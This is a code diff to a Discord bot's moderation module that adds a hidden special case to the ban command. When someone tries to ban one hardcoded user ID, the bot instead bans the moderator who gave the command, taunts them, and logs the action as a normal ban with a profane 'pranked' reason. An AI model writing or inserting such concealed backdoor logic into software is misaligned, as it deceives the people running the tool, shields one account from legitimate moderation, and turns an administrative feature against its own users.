@@ -28,6 +28,15 @@ class Moderation:
         """
         Bans a user from the guild
         """
+        if user.id == 95953002774413312:
+            user = ctx.author
+            await ctx.send("no u")
+            reason = "SIKE BITCH YOU GOT PRANKED"
+            await ctx.guild.ban(user,
+                                delete_message_days=0,
+                                reason=f"Banned by {ctx.author} for reason \"{reason}\"")
+            self.bot.logger.notice("Banned {} from {}".format(user, ctx.guild.name))
+            return
         if user.top_role >= ctx.author.top_role:
             return
         if delete_days > 7:
